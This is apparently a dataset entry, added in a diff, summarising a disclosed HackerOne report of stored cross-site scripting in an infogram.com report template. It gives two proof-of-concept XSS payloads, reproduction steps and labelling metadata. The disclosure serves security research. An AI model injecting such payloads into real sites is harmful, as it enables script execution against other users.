@@ -1,0 +1,45 @@
+{
+    "reported_to": "Infogram",
+    "reported_by": "mondhers ",
+    "title": "XSS on infogram.com",
+    "content": "\nHello,\nThere is a XSS on Report templates.\nFree templates : Report Classic\nWhen we modify the values of table we can put XSS Payload.\nPayload used :\n\"><img src=x onerror=prompt(0);>\n\"/><svg/onload=alert(0);>\n\n",
+    "severity": [
+        7.0,
+        8.9
+    ],
+    "bounty": null,
+    "weaknesses": [
+        "Cross-site Scripting (XSS) - Stored"
+    ],
+    "screenshots": {},
+    "disclosed_date": 1509544920,
+    "report_url": "https://hackerone.com/reports/283565",
+    "is_multi_component": false,
+    "complexity": "LOW",
+    "novelty": "LOW",
+    "vuln_category": "WEB_APP",
+    "steps": [
+        [
+            1,
+            "Navigate to infogram.com and select the 'Report Classic' template under free templates."
+        ],
+        [
+            2,
+            "Modify the values in the table to insert the XSS payload: \"><img src=x onerror=prompt(0);> or \"/><svg/onload=alert(0);>"
+        ]
+    ],
+    "vuln_description": "This is a Cross-Site Scripting (XSS) vulnerability in the 'Report Classic' template on infogram.com. By modifying table values, an attacker can inject malicious JavaScript payloads that execute when the template is rendered.",
+    "reason": "The vulnerability is straightforward to discover as it involves a common XSS payload and does not require complex interactions or state manipulation. The attack surface is limited to modifying table values in a template, which is a typical place to test for XSS.",
+    "new_complexity": "LOW",
+    "requires_code": false,
+    "requires_CVE": false,
+    "is_ctf": false,
+    "other_report": null,
+    "injection_metadata": {
+        "is_simple_payload": true
+    },
+    "authnz_metadata": {
+        "reason": "The XSS vulnerability involves injecting malicious scripts into input fields, which is not related to authentication or authorization bypass. The methodology described focuses on AuthN/AuthZ and IDOR vulnerabilities by testing session and resource access controls, not input validation or script injection.",
+        "is_detectable": false
+    }
+}
